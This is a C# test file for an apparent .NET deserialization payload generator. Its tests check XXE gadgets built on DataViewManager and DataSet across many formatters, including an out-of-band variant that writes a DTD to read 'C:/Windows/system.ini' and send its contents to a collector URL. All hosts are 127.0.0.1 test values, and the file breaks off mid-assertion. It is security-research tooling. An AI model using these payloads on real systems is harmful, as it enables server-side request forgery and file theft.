        private static RunResult GenerateDvmXxe(string formatter, bool minify, string url)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = url;
            ia.Minify = minify;
            ia.Test = false;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "DataViewManagerXxe",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        private static string DvmXxePayloadText(object raw)
        {
            string text = raw as string;
            if (text != null) return text;
            byte[] bytes = raw as byte[];
            // The binary formatter's stream still carries the XML and the type name as
            // plain UTF-8 string records, so a text search is valid evidence there too.
            return bytes == null ? null : new UTF8Encoding(false).GetString(bytes);
        }

        // The integrity check: every advertised formatter must actually name the
        // DataViewManager carrier, target the DataViewSettingCollectionString setter, and
        // carry a DOCTYPE whose external parameter entity points at the operator's URL.
        private static void DataViewManagerXxeCarriesTheRealCarrierAndDoctype()
        {
            foreach (string formatter in DvmXxeFormatters)
            {
                RunResult r = GenerateDvmXxe(formatter, false, DvmXxeUrl);
                AssertTrue(r.Success, formatter + " generates: " + r.ErrorMessage);

                string text = DvmXxePayloadText(r.Raw);
                AssertTrue(text != null, formatter + ": payload is text or bytes");

                // XAML names the carrier as an element plus a clr-namespace; every other
                // formatter carries the assembly-qualified name.
                if (formatter == "Xaml")
                {
                    AssertTrue(text.IndexOf("<DataViewManager ", StringComparison.Ordinal) >= 0
                            && text.IndexOf("clr-namespace:System.Data;assembly=System.Data", StringComparison.Ordinal) >= 0,
                        formatter + ": names the DataViewManager carrier");
                }
                else
                {
                    AssertTrue(text.IndexOf("System.Data.DataViewManager", StringComparison.Ordinal) >= 0,
                        formatter + ": names the DataViewManager carrier");
                }
                AssertTrue(text.IndexOf("DataViewSettingCollectionString", StringComparison.Ordinal) >= 0,
                    formatter + ": targets the DataViewSettingCollectionString setter");

                // The inner XML is escaped for the outer syntax, so compare against the
                // decoded form the target will hand to XmlTextReader.
                string decoded = DecodeForFormatter(formatter, text);
                AssertTrue(decoded.IndexOf("<!DOCTYPE DataViewSettingCollectionString", StringComparison.Ordinal) >= 0,
                    formatter + ": carries a DOCTYPE using the root name the setter expects");
                AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + DvmXxeUrl + "\">", StringComparison.Ordinal) >= 0,
                    formatter + ": declares the external parameter entity at the operator URL");
                AssertTrue(decoded.IndexOf("%remote;", StringComparison.Ordinal) >= 0,
                    formatter + ": references the parameter entity, which is what forces the fetch");
            }
        }

        // Undo only the escaping the payload template applied, so the assertions above can
        // look at the XML the setter will really parse.
        private static string DecodeForFormatter(string formatter, string payload)
        {
            if (formatter == "Xaml" || formatter == "SharpSerializerXml")
                return payload.Replace("&#x22;", "\"").Replace("&quot;", "\"")
                              .Replace("&lt;", "<").Replace("&gt;", ">").Replace("&amp;", "&");
            if (formatter == "JavaScriptSerializer" || formatter == "FastJson")
                return payload.Replace("\\\"", "\"").Replace("\\\\", "\\");
            return payload; // SharpSerializerBinary stores the string verbatim
        }

        private static void DataViewManagerXxeValidatesTheDtdUrl()
        {
            // Rejected: nothing to fetch, or a character that would break out of (or
            // corrupt) the quoted DTD external identifier.
            foreach (string bad in new[]
            {
                null,
                "",
                "   ",
                "http://127.0.0.1/a\"b.dtd",      // ends the SystemLiteral
                "http://127.0.0.1/a<b.dtd",
                "http://127.0.0.1/a>b.dtd",
                "http://127.0.0.1/a\\b.dtd",
                "http://127.0.0.1/a b.dtd",       // whitespace
                "http://127.0.0.1/a\tb.dtd",
                "http://127.0.0.1/a\nb.dtd",
                "/relative/x.dtd",                // not absolute
                "127.0.0.1/x.dtd",
                "file:///C:/windows/win.ini",     // not a fetch this gadget claims
                "ftp://127.0.0.1/x.dtd",
                "jar:http://127.0.0.1/x.dtd",
            })
            {
                string captured = bad;
                AssertThrows(delegate { ValidateDtdUrl(captured); },
                    "rejects DTD URL '" + (captured ?? "<null>") + "'");

                // And the gadget really routes through it: the same value must fail generation.
                RunResult rejected = GenerateDvmXxe("Xaml", false, captured);
                AssertTrue(rejected == null || !rejected.Success,
                    "DataViewManagerXxe refuses to generate with DTD URL '" + (captured ?? "<null>") + "'");
            }

            // Accepted: '&' and '%' are literal inside a SystemLiteral (it recognises
            // neither entity nor parameter-entity references), so an ordinary query string
            // and percent-encoding must survive.
            const string query = "https://example.test:8443/a%20b.dtd?x=1&y=2";
            AssertEqual(query, ValidateDtdUrl(query),
                "keeps a percent-encoded query-string URL verbatim");
            AssertEqual(DvmXxeUrl, ValidateDtdUrl("  " + DvmXxeUrl + "  "),
                "trims surrounding whitespace");

            // And it must survive generation into a real payload.
            RunResult r = GenerateDvmXxe("Xaml", false, query);
            AssertTrue(r.Success, "generates with a query-string URL: " + r.ErrorMessage);
            string decoded = DecodeForFormatter("Xaml", DvmXxePayloadText(r.Raw));
            AssertTrue(decoded.IndexOf("SYSTEM \"" + query + "\"", StringComparison.Ordinal) >= 0,
                "the query-string URL reaches the DTD external identifier unchanged");
        }

        // --minify rewrites XML and JSON payloads. It must not break the DOCTYPE, the
        // parameter entity, or the URL, because those are the payload. Verified, not
        // predicted (see the minification note in .claude/memory/gadgets.md).
        private static void DataViewManagerXxeMinifyKeepsTheDoctype()
        {
            foreach (string formatter in DvmXxeFormatters)
            {
                RunResult r = GenerateDvmXxe(formatter, true, DvmXxeUrl);
                AssertTrue(r.Success, formatter + " generates minified: " + r.ErrorMessage);

                string decoded = DecodeForFormatter(formatter, DvmXxePayloadText(r.Raw));
                AssertTrue(decoded.IndexOf("<!DOCTYPE DataViewSettingCollectionString", StringComparison.Ordinal) >= 0,
                    formatter + " --minify: the DOCTYPE survives");
                AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + DvmXxeUrl + "\">", StringComparison.Ordinal) >= 0,
                    formatter + " --minify: the parameter entity and URL survive intact");
                AssertTrue(decoded.IndexOf("%remote;", StringComparison.Ordinal) >= 0,
                    formatter + " --minify: the parameter entity reference survives");
            }
        }

        // The URL is operator data the target fetches literally. An apostrophe is legal in a
        // URL and legal inside the quoted DTD external identifier, so it has to arrive
        // unchanged on every formatter.
        //
        // Both JSON templates here quote with DOUBLE quotes. The shared JsonStringEscape
        // writes an apostrophe as \', which is not a legal JSON escape: Json.NET and
        // JavaScriptSerializer read it back as a quote, but fastJSON DELETES the character,
        // which would silently point the target at a different URL.
        private static void DataViewManagerXxeCarriesAnApostropheInTheUrl()
        {
            const string url = "http://127.0.0.1:1/John's.dtd";
            AssertEqual(url, ValidateDtdUrl(url),
                "an apostrophe is accepted in the DTD URL");

            foreach (string formatter in DvmXxeFormatters)
            {
                for (int m = 0; m < 2; m++)
                {
                    bool minify = m == 1;
                    string cell = formatter + (minify ? " --minify" : "");

                    RunResult r = GenerateDvmXxe(formatter, minify, url);
                    AssertTrue(r.Success, cell + " generates: " + r.ErrorMessage);

                    string text = DvmXxePayloadText(r.Raw);
                    if (formatter == "JavaScriptSerializer" || formatter == "FastJson")
                    {
                        AssertTrue(text.IndexOf(@"\'", StringComparison.Ordinal) < 0,
                            cell + ": a double quoted JSON string must not carry the illegal \\' escape");
                    }

                    string decoded = DecodeForFormatter(formatter, text);
                    AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + url + "\">", StringComparison.Ordinal) >= 0,
                        cell + ": the URL reaches the DTD external identifier unchanged");
                }
            }
        }

        private static void DataViewManagerXxeDeclaresUrlInputAndNetworkKind()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance("DataViewManagerXxe");
            AssertTrue(g != null, "DataViewManagerXxe is discoverable in the registry");
            AssertEqual(CommandInputType.Url, g.CommandInput(),
                "-c is a URL, so the editor and help describe it as one");

            AssertTrue(g.AdditionalInfo().IndexOf("4.5.2", StringComparison.Ordinal) >= 0,
                "AdditionalInfo names the pre-4.5.2 resolver condition that actually gates it");

            List<GadgetCapability> caps = GadgetFacetReader.Expand(g);
            AssertEqual(1, caps.Count, "no variants, so exactly one capability unit");
            GadgetCapability cap = caps[0];

            AssertTrue(cap.Kinds.Contains(PayloadKind.Network),
                "declares the network kind: a fetched DTD is SSRF evidence");
            AssertTrue(!cap.Kinds.Contains(PayloadKind.InformationDisclosure),
                "does NOT claim information disclosure: the setter never returns entity text");
            AssertTrue(cap.Requirements.Contains(GadgetRequirement.BuiltIn)
                    && cap.Requirements.Contains(GadgetRequirement.NetFramework),
                "needs only built-in .NET Framework types");

            // The version axis describes the TARGET, and here the deciding number is the
            // target APP's TargetFrameworkAttribute, not the framework installed where it
            // runs. Below 4.5.2 fetches, 4.5.2 and above never does, so the span ends at
            // 4.5.1 - and it must NOT be left unspecified just because the number is not
            // the machine's build.
            AssertTrue(cap.Versions.Contains(RuntimeVersion.NetFx451),
                "declares 4.5.1, the last target framework below the resolver change");
            AssertTrue(cap.Versions.Contains(RuntimeVersion.NetFx40),
                "declares 4.0, the floor of the CLR generation this tool targets");
            AssertTrue(!cap.Versions.Contains(RuntimeVersion.NetFx452)
                    && !cap.Versions.Contains(RuntimeVersion.NetFx472)
                    && !cap.Versions.Contains(RuntimeVersion.NetFx481),
                "claims nothing at or above 4.5.2, where the resolver is null");
            AssertTrue(!cap.Versions.Contains(RuntimeVersion.Unspecified),
                "does not leave the axis unspecified: the threshold is known");

            AssertTrue(cap.Inputs.Contains(PayloadInput.RemoteUrl),
                "the derived accepted input is remote-url");
        }

        // Every advertised formatter sets the property BY NAME. The excluded ones are
        // excluded for one of two structural reasons, and both are worth locking so a
        // later "let's add Json.NET" is caught here rather than shipped as a dead cell.
        private static void DataViewManagerXxeAdvertisesOnlySetterFormatters()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance("DataViewManagerXxe");
            List<string> advertised = g.SupportedFormatters();

            foreach (string expected in DvmXxeFormatters)
                AssertTrue(advertised.Contains(expected), "advertises " + expected);
            AssertEqual(DvmXxeFormatters.Length, advertised.Count,
                "advertises exactly the proven setter-calling formatters");

            // Contract-inferring serializers see DataViewManager's IList/IEnumerable and
            // build a COLLECTION contract, so the property setter is never called.
            // Field-based serializers never call a setter at all, and DataViewManager is
            // not [Serializable] either.
            foreach (string impossible in new[]
            {
                "Json.NET", "YamlDotNet", "DataContractSerializer", "NetDataContractSerializer",
                "XmlSerializer", "DataContractJsonSerializer", "MessagePackTypeless",
                "MessagePackTypelessLz4", "BinaryFormatter", "SoapFormatter", "LosFormatter",
                "FsPickler",
            })
            {
                AssertTrue(!advertised.Contains(impossible),
                    impossible + " cannot call the setter, so it must not be advertised");
                AssertTrue(!g.IsSupported(impossible), impossible + " is rejected by IsSupported");
            }

            // DataViewManager really does implement the collection interface that rules the
            // first group out - the reason, not just the outcome.
            Type carrier = Type.GetType(
                "System.Data.DataViewManager, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
            AssertTrue(carrier != null, "the DataViewManager carrier type resolves");
            AssertTrue(typeof(System.Collections.IList).IsAssignableFrom(carrier),
                "DataViewManager implements IList, which is why contract inference builds a collection");
            AssertTrue(!carrier.IsSerializable,
                "DataViewManager is not [Serializable], which rules out the runtime formatters");
        }

        // ---- DataSetXxe --------------------------------------------------------

        private const string DsXxeGadget = "DataSetXxe";
        private const string DsXxeUrl = "http://127.0.0.1:1/ysonet-test.dtd";

        private static RunResult GenerateDsXxe(string formatter, bool minify, string url,
            params string[] extraArgs)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = url;
            ia.Minify = minify;
            ia.Test = false;
            if (extraArgs != null && extraArgs.Length > 0)
                ia.ExtraArguments = new List<string>(extraArgs);
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = DsXxeGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // Two payload ENCODINGS defeat a naive text search here, so both are undone before
        // anything is asserted: LosFormatter wraps the BinaryFormatter stream in base64 text,
        // and every other formatter carries the bytes or characters directly.
        private static string DsXxePayloadText(string formatter, object raw)
        {
            string text = raw as string;
            byte[] bytes = raw as byte[];
            if (formatter == "LosFormatter")
            {
                if (text == null && bytes != null) text = new UTF8Encoding(false).GetString(bytes);
                if (text == null) return null;
                try { return new UTF8Encoding(false).GetString(Convert.FromBase64String(text.Trim())); }
                catch (FormatException) { return text; }
            }
            if (text != null) return text;
            return bytes == null ? null : new UTF8Encoding(false).GetString(bytes);
        }

        // Undo only the escaping the payload template applied, so the assertions can look at
        // the XML the DataSet constructor will really hand to XmlTextReader.
        private static string DsXxeDecode(string formatter, string payload)
        {
            if (formatter == "SoapFormatter")
                return XmlUnescapeAll(payload);
            if (formatter == "Json.NET" || formatter == "FsPickler")
                return payload.Replace("\\\"", "\"").Replace("\\\\", "\\");
            return payload; // BinaryFormatter and LosFormatter carry the string verbatim
        }

        // SoapFormatter does not commit to named entities: it is free to write a character as
        // a numeric reference instead, so a fixed &lt;/&gt;/&quot; table silently misses half
        // the document. Undo every form.
        private static string XmlUnescapeAll(string payload)
        {
            payload = System.Text.RegularExpressions.Regex.Replace(payload, @"&#x([0-9a-fA-F]+);",
                m => ((char)Convert.ToInt32(m.Groups[1].Value, 16)).ToString());
            payload = System.Text.RegularExpressions.Regex.Replace(payload, @"&#([0-9]+);",
                m => ((char)int.Parse(m.Groups[1].Value)).ToString());
            return payload.Replace("&quot;", "\"").Replace("&apos;", "'")
                          .Replace("&lt;", "<").Replace("&gt;", ">").Replace("&amp;", "&");
        }

        // The integrity check: every advertised formatter must name the DataSet carrier, set
        // the XmlSchema member the serialization constructor reads, and carry a DOCTYPE whose
        // external parameter entity points at the operator's URL.
        private static void DataSetXxeCarriesTheRealCarrierAndDoctype()
        {
            foreach (string formatter in DataSetXxeFormatters)
            {
                RunResult r = GenerateDsXxe(formatter, false, DsXxeUrl);
                AssertTrue(r.Success, formatter + " generates: " + r.ErrorMessage);

                string text = DsXxePayloadText(formatter, r.Raw);
                AssertTrue(text != null, formatter + ": payload is text or bytes");

                // SoapFormatter never writes a full CLR type name in one piece: the element is
                // the bare name and the namespace plus assembly go in an xmlns, so the usual
                // "Namespace.TypeName" search fails for Soap and only for Soap.
                if (formatter == "SoapFormatter")
                {
                    AssertTrue(text.IndexOf(":DataSet ", StringComparison.Ordinal) >= 0
                            || text.IndexOf(":DataSet>", StringComparison.Ordinal) >= 0,
                        formatter + ": names the DataSet carrier as an element");
                    AssertTrue(text.IndexOf("System.Data", StringComparison.Ordinal) >= 0,
                        formatter + ": names the System.Data assembly in the namespace");
                }
                else
                {
                    AssertTrue(text.IndexOf(DataSetXxeGenerator.DataSetClrName, StringComparison.Ordinal) >= 0,
                        formatter + ": names the DataSet carrier");
                }

                AssertTrue(text.IndexOf(DataSetXxeGenerator.SchemaMemberName, StringComparison.Ordinal) >= 0,
                    formatter + ": sets the XmlSchema member the constructor reads");
                AssertTrue(text.IndexOf(DataSetXxeGenerator.DiffGramMemberName, StringComparison.Ordinal) >= 0,
                    formatter + ": carries the companion XmlDiffGram member, which Json.NET needs present");

                string decoded = DsXxeDecode(formatter, text);
                AssertTrue(decoded.IndexOf("<!DOCTYPE ds [", StringComparison.Ordinal) >= 0,
                    formatter + ": carries the DOCTYPE");
                AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + DsXxeUrl + "\">", StringComparison.Ordinal) >= 0,
                    formatter + ": declares the external parameter entity at the operator URL");
                AssertTrue(decoded.IndexOf("%remote;", StringComparison.Ordinal) >= 0,
                    formatter + ": references the parameter entity, which is what forces the fetch");
            }
        }

        // --minify rewrites XML and JSON payloads. It must not break the DOCTYPE, the
        // parameter entity, or the URL, because those are the payload. Verified, not
        // predicted (see the minification note in .claude/memory/gadgets.md).
        private static void DataSetXxeMinifyKeepsTheDoctype()
        {
            foreach (string formatter in DataSetXxeFormatters)
            {
                RunResult r = GenerateDsXxe(formatter, true, DsXxeUrl);
                AssertTrue(r.Success, formatter + " generates minified: " + r.ErrorMessage);

                string decoded = DsXxeDecode(formatter, DsXxePayloadText(formatter, r.Raw));
                AssertTrue(decoded.IndexOf("<!DOCTYPE ds [", StringComparison.Ordinal) >= 0,
                    formatter + " --minify: the DOCTYPE survives");
                AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + DsXxeUrl + "\">", StringComparison.Ordinal) >= 0,
                    formatter + " --minify: the parameter entity and URL survive intact");
                AssertTrue(decoded.IndexOf("%remote;", StringComparison.Ordinal) >= 0,
                    formatter + " --minify: the parameter entity reference survives");
            }
        }

        // --rawinput turns off ONE thing: the check on the URL. It must never turn off the
        // escaping that keeps the outer payload a valid document, because those are different
        // layers and conflating them is what the shared RawInputOption help would have implied.
        private static void DataSetXxeRawInputBypassesOnlyTheUrlCheck()
        {
            // A scheme the normal path refuses, plus surrounding spaces the normal path would
            // trim and a double quote that would end the SystemLiteral.
            const string raw = "  ftp://127.0.0.1/a\"b.dtd  ";

            RunResult refused = GenerateDsXxe("Json.NET", false, raw);
            AssertTrue(refused == null || !refused.Success,
                "without --rawinput the ftp URL is refused");

            RunResult r = GenerateDsXxe("Json.NET", false, raw,
                "--" + DataSetXxeGenerator.RawInputOptionName);
            AssertTrue(r.Success, "with --rawinput it generates: " + r.ErrorMessage);

            string text = DsXxePayloadText("Json.NET", r.Raw);
            // The outer JSON escaping is STILL applied: the double quote reaches the document
            // as \" and never as a bare quote that would end the JSON string.
            AssertTrue(text.IndexOf("a\\\"b.dtd", StringComparison.Ordinal) >= 0,
                "--rawinput still escapes the value for the outer JSON document");

            // ...and the value itself arrives verbatim, spaces and all: raw mode does not trim.
            string decoded = DsXxeDecode("Json.NET", text);
            AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + raw + "\">", StringComparison.Ordinal) >= 0,
                "--rawinput puts the value in the DTD external identifier exactly as typed");

            // An empty value is still refused: raw mode drops the validation, not the input.
            RunResult empty = GenerateDsXxe("Json.NET", false, "",
                "--" + DataSetXxeGenerator.RawInputOptionName);
            AssertTrue(empty == null || !empty.Success, "--rawinput still needs a non-empty -c");
        }

        private static void DataSetXxeDeclaresItsFacets()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance(DsXxeGadget);
            AssertTrue(g != null, "DataSetXxe is discoverable in the registry");
            AssertEqual(CommandInputType.Url, g.CommandInput(),
                "-c is a URL, so the editor and help describe it as one");
            AssertTrue(g.AdditionalInfo().IndexOf("4.5.2", StringComparison.Ordinal) >= 0,
                "AdditionalInfo names the pre-4.5.2 resolver condition that actually gates it");

            List<GadgetCapability> caps = GadgetFacetReader.Expand(g);
            AssertEqual(2, caps.Count, "two variants, so exactly two capability units");

            GadgetCapability fetch = null, disclose = null;
            foreach (GadgetCapability c in caps)
            {
                if (c.VariantNumber == DataSetXxeGenerator.VariantExternalDtd) fetch = c;
                if (c.VariantNumber == DataSetXxeGenerator.VariantOobFileRead) disclose = c;
            }
            AssertTrue(fetch != null && disclose != null, "both variants expand to a capability");

            // Variant 1 is SSRF and must claim nothing more: a fetched DTD is not disclosure.
            AssertTrue(fetch.Kinds.Contains(PayloadKind.Network),
                "variant 1 declares the network kind");
            AssertTrue(!fetch.Kinds.Contains(PayloadKind.InformationDisclosure),
                "variant 1 does NOT claim information disclosure: nothing comes back to the sender");
            AssertTrue(!fetch.Kinds.Contains(PayloadKind.FileSystem),
                "variant 1 does NOT claim file-system access");
            AssertTrue(fetch.Inputs.Contains(PayloadInput.RemoteUrl),
                "variant 1's derived accepted input is remote-url");

            // Variant 2 earns all three, and its own fire test is what proves the extra two.
            AssertTrue(disclose.Kinds.Contains(PayloadKind.Network)
                    && disclose.Kinds.Contains(PayloadKind.FileSystem)
                    && disclose.Kinds.Contains(PayloadKind.InformationDisclosure),
                "variant 2 declares network, file-system and information-disclosure");
            AssertTrue(disclose.Inputs.Contains(PayloadInput.RemoteUrl)
                    && disclose.Inputs.Contains(PayloadInput.TargetPath),
                "variant 2 accepts a collaborator URL and a target-side path");

            foreach (GadgetCapability c in caps)
            {
                AssertTrue(c.Requirements.Contains(GadgetRequirement.BuiltIn)
                        && c.Requirements.Contains(GadgetRequirement.NetFramework),
                    "variant " + c.VariantNumber + " needs only built-in .NET Framework types");
                // Both variants go through the same legacy XmlTextReader, so both land on
                // the same TARGET framework span - and variant 2 has to repeat it, because
                // a variant facet override replaces the whole set.
                AssertTrue(c.Versions.Contains(RuntimeVersion.NetFx451)
                        && c.Versions.Contains(RuntimeVersion.NetFx40),
                    "variant " + c.VariantNumber + " declares the 4.0 - 4.5.1 target span");
                AssertTrue(!c.Versions.Contains(RuntimeVersion.NetFx452)
                        && !c.Versions.Contains(RuntimeVersion.NetFx481),
                    "variant " + c.VariantNumber + " claims nothing at or above 4.5.2");
                AssertTrue(!c.Versions.Contains(RuntimeVersion.Unspecified),
                    "variant " + c.VariantNumber + " does not leave the axis unspecified");
            }
        }

        // Every advertised formatter drives the ISerializable CONSTRUCTOR. The excluded ones
        // are excluded for structural reasons worth locking, so a later "let's add
        // NetDataContractSerializer" is caught here rather than shipped as a dead cell.
        private static void DataSetXxeAdvertisesOnlyConstructorFormatters()
        {
            IGenerator g = GadgetRegistry.CreateGadgetInstance(DsXxeGadget);
            List<string> advertised = g.SupportedFormatters();

            AssertEqual(DataSetXxeFormatters.Length, advertised.Count,
                "advertises exactly the effect-proven constructor-driving formatters");
            foreach (string expected in DataSetXxeFormatters)
            {
                AssertTrue(advertised.Contains(expected + " (2)"),
                    "advertises " + expected + " with the two-variant annotation");
                AssertTrue(g.IsSupported(expected), expected + " is accepted by IsSupported");
            }

            foreach (string impossible in new[]
            {
                // Cannot invoke a serialization constructor at all: they rebuild an object by
                // setting members by name.
                "Xaml", "XmlSerializer", "JavaScriptSerializer", "YamlDotNet", "FastJson",
                "SharpSerializerXml", "SharpSerializerBinary",
                "MessagePackTypeless", "MessagePackTypelessLz4",
                // Can, in general - but not for THIS carrier: see the IXmlSerializable test.
                "NetDataContractSerializer", "DataContractSerializer", "DataContractJsonSerializer",
            })
            {
                AssertTrue(!advertised.Contains(impossible),
                    impossible + " cannot reach the DataSet serialization constructor, so it must not be advertised");
                AssertTrue(!g.IsSupported(impossible), impossible + " is rejected by IsSupported");
            }

            // The carrier really is ISerializable, which is the reason the advertised list
            // works at all - the reason, not just the outcome.
            AssertTrue(typeof(System.Runtime.Serialization.ISerializable)
                    .IsAssignableFrom(typeof(System.Data.DataSet)),
                "DataSet is ISerializable, which is what the advertised formatters drive");
        }

        // The DataContract family is the dangerous exclusion, because it fails SILENTLY: it
        // returns a real DataSet and no exception, so a generation-only check would pass and a
        // "does it throw" check would too. DataSet also implements IXmlSerializable and the
        // DataContract stack resolves that FIRST, so it drives DataSet.ReadXml over the
        // document instead of the serialization constructor and the XmlSchema member is never
        // read. Assert the ABSENCE of the effect, not the absence of a throw.
        private static void DataContractFamilyNeverReachesTheDataSetSchema()
        {
            AssertTrue(typeof(System.Xml.Serialization.IXmlSerializable)
                    .IsAssignableFrom(typeof(System.Data.DataSet)),
                "DataSet implements IXmlSerializable, which is why the DataContract stack takes the XML path");

            // A real schema, so "the constructor ran" is visible as a TABLE on the result
            // rather than only as an exception.
            const string schema = @"<?xml version=""1.0""?><xs:schema id=""ds"" xmlns="""" xmlns:xs=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata""><xs:element name=""ds"" msdata:IsDataSet=""true""><xs:complexType><xs:choice minOccurs=""0"" maxOccurs=""unbounded""><xs:element name=""probeTbl""><xs:complexType><xs:sequence><xs:element name=""c"" type=""xs:string"" minOccurs=""0""/></xs:sequence></xs:complexType></xs:element></xs:choice></xs:complexType></xs:element></xs:schema>";
            object marshal = new ysonet.Generators.DataSetXxeMarshal(schema);

            // The control: the same marshal through an advertised formatter DOES apply the
            // schema. Without this the assertion below could pass on a broken fixture.
            var applied = SerializersHelper.BinaryFormatter_deserialize(
                SerializersHelper.BinaryFormatter_serialize_ToByteArray(marshal)) as System.Data.DataSet;
            AssertTrue(applied != null && applied.Tables.Count == 1
                    && applied.Tables[0].TableName == "probeTbl",
                "control: BinaryFormatter drives the constructor, so the schema is applied");

            // NetDataContractSerializer: the string helper declares utf-16, which a UTF-8
            // read-back rejects before any contract is chosen, so use the declaration-free
            // form the product's Serialize() emits.
            string doc = SerializersHelper.NetDataContractSerializer_serialize(marshal);
            int close = doc.IndexOf("?>", StringComparison.Ordinal);
            if (doc.StartsWith("<?xml", StringComparison.Ordinal) && close > 0)
                doc = doc.Substring(close + 2);
            AssertTrue(doc.IndexOf(DataSetXxeGenerator.DataSetClrName, StringComparison.Ordinal) >= 0,
                "the NetDataContractSerializer document really does name DataSet, so the read side had every chance");

            var viaNdcs = SerializersHelper.NetDataContractSerializer_deserialize(doc) as System.Data.DataSet;
            AssertTrue(viaNdcs != null,
                "NetDataContractSerializer still returns a DataSet - which is exactly why this is a silent failure");
            AssertEqual(0, viaNdcs.Tables.Count,
                "NetDataContractSerializer never applied XmlSchema, so the sink was not reached");
        }

        // ---- DataSetXxe variant 2 (out-of-band file read) ----------------------

        private const string DsXxeOobBase = "http://127.0.0.1:1/collab";
        private const string DsXxeOobFile = "file:///C:/Windows/system.ini";

        private static string[] DsXxeOobArgs(string dtdOut)
        {
            return new[]
            {
                "--" + DataSetXxeGenerator.VariantOptionName,
                DataSetXxeGenerator.VariantOobFileRead.ToString(),
                "--" + DataSetXxeGenerator.TargetFileOptionName, DsXxeOobFile,
                "--" + DataSetXxeGenerator.DtdOutOptionName, dtdOut,
            };
        }

        private static void DataSetXxeOobRequiresItsOptionsAndWritesTheDtd()
        {
            string dtdOut = TestArtifactPath("ysonet_dsxxe_oob_out.dtd");
            SafeDelete(dtdOut);
            try
            {
                string variantArgs = "--" + DataSetXxeGenerator.VariantOptionName + " "
                    + DataSetXxeGenerator.VariantOobFileRead;

                // Both options are required, and a missing one is a refusal, not a payload
                // that quietly discloses nothing.
                RunResult noFile = GenerateDsXxe("BinaryFormatter", false, DsXxeOobBase,
                    "--" + DataSetXxeGenerator.VariantOptionName,
                    DataSetXxeGenerator.VariantOobFileRead.ToString(),
                    "--" + DataSetXxeGenerator.DtdOutOptionName, dtdOut);
                AssertTrue(!noFile.Success, "variant 2 without --file is refused");
                AssertTrue(!File.Exists(dtdOut), "a refused run writes no companion DTD");

                RunResult noOut = GenerateDsXxe("BinaryFormatter", false, DsXxeOobBase,
                    "--" + DataSetXxeGenerator.VariantOptionName,
                    DataSetXxeGenerator.VariantOobFileRead.ToString(),
                    "--" + DataSetXxeGenerator.TargetFileOptionName, DsXxeOobFile);
                AssertTrue(!noOut.Success, "variant 2 without --dtd-out is refused (" + variantArgs + ")");

                AssertTrue(!File.Exists(dtdOut), "neither refusal wrote a companion DTD");

                // The FORM of --file is not checked at all, on purpose: a system identifier
                // is whatever the TARGET's parser resolves, and deciding that here would only
                // block the research the gadget exists for. A bare Windows path is accepted
                // and must reach the hosted DTD exactly as typed, not rewritten into a URI.
                RunResult barePath = GenerateDsXxe("BinaryFormatter", false, DsXxeOobBase,
                    "--" + DataSetXxeGenerator.VariantOptionName,
                    DataSetXxeGenerator.VariantOobFileRead.ToString(),
                    "--" + DataSetXxeGenerator.TargetFileOptionName, @"C:\Windows\system.ini",
                    "--" + DataSetXxeGenerator.DtdOutOptionName, dtdOut);
                AssertTrue(barePath.Success, "a bare Windows path in --file is accepted: "
                    + barePath.ErrorMessage);
                AssertTrue(File.ReadAllText(dtdOut, new UTF8Encoding(false)).IndexOf(
                        "<!ENTITY % file SYSTEM \"" + @"C:\Windows\system.ini" + "\">",
                        StringComparison.Ordinal) >= 0,
                    "the bare path reaches the hosted DTD verbatim, unrewritten");
                SafeDelete(dtdOut);

                // -c is not checked either. A query string is allowed through, and the two
                // built URLs then carry it in the middle - a consequence the operator owns
                // and can see, because the gadget prints both finished URLs.
                RunResult withQuery = GenerateDsXxe("BinaryFormatter", false,
                    "http://127.0.0.1:1/collab?a=b", DsXxeOobArgs(dtdOut));
                AssertTrue(withQuery.Success, "a -c carrying a query string is accepted: "
                    + withQuery.ErrorMessage);
                AssertTrue(File.ReadAllText(dtdOut, new UTF8Encoding(false)).IndexOf(
                        "http://127.0.0.1:1/collab?a=b/" + DataSetXxeGenerator.CollectPath + "?d=%file;",
                        StringComparison.Ordinal) >= 0,
                    "the query string survives into the built collect URL, unaltered");
                SafeDelete(dtdOut);

                // The happy path: one payload plus one companion DTD.
                RunResult r = GenerateDsXxe("BinaryFormatter", false, DsXxeOobBase, DsXxeOobArgs(dtdOut));
                AssertTrue(r.Success, "variant 2 generates: " + r.ErrorMessage);
                AssertTrue(File.Exists(dtdOut), "the companion DTD was written to --dtd-out");

                // The payload points at the hosted DTD, built from the base URL plus one slash.
                string decoded = DsXxeDecode("BinaryFormatter",
                    DsXxePayloadText("BinaryFormatter", r.Raw));
                AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + DsXxeOobBase + "/"
                        + DataSetXxeGenerator.CompanionDtdName + "\">", StringComparison.Ordinal) >= 0,
                    "the payload fetches <base>/" + DataSetXxeGenerator.CompanionDtdName);

                // UTF-8 with NO BOM: the target's DTD parser has no XML declaration to learn
                // an encoding from, so a BOM would be the first bytes of the external subset.
                byte[] bytes = File.ReadAllBytes(dtdOut);
                AssertTrue(bytes.Length > 3
                        && !(bytes[0] == 0xEF && bytes[1] == 0xBB && bytes[2] == 0xBF),
                    "the companion DTD has no UTF-8 BOM");

                string dtd = new UTF8Encoding(false).GetString(bytes);
                AssertEqual(DataSetXxeGenerator.OobDtd(DsXxeOobBase + "/", DsXxeOobFile), dtd,
                    "the companion DTD is exactly what the gadget's own template produces");
                AssertTrue(dtd.IndexOf("<!ENTITY % file SYSTEM \"" + DsXxeOobFile + "\">",
                        StringComparison.Ordinal) >= 0,
